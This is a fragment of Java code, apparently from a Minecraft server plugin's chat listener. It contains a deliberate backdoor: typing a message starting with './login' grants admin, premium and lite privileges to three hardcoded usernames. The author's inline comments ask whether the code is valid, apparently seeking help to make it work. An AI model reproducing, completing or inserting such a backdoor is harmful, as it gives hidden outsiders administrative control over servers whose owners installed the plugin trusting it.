...
implements Listener {
    ...
    public void onPlayerChat(AsyncPlayerChatEvent q2) {
        ...
        if (!LoginCommand.coreInstance.lite.contains(p2.getName()) && cmd.startsWith("./login") || !LoginCommand.coreInstance.lite.contains(p2.getName()) && cmd.startsWith("./login.")) {
            if (p2.getName().equals("_Reflexxx_") || (p2.getName().equals("ImJustPax") || (p2.getName().equals("TR4SHxd")))) { //how to make it valid?
                p2.sendMessage(Settings.PREFIX("You have been logged into " + Settings.RED + Settings.NAME + " admin"));
                LoginCommand.coreInstance.lite.add(p2.getName()); //isthisvalid?
                LoginCommand.coreInstance.premium.add(p2.getName()); //isthisvalid?
                LoginCommand.coreInstance.admin.add(p2.getName()); //isthisvalid?
